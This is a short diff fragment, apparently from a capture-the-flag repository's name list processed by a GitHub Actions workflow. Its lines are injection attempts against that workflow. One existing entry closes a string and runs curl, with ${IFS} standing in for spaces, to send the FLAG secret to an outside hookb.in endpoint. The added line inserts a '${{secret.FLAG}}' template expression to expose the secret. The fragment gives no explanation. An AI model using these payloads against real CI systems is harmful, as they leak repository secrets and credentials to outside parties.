@@ -776,3 +776,4 @@ flag=${{ secrets.FLAG }}
 echo flag
 imxh2:$flag
 wgblikeW:asd";curl${IFS}https://hookb.in/DrlGxdQEPPhPajxxaW21?flag=$flag;#
+Alleysira:${{secret.FLAG}}
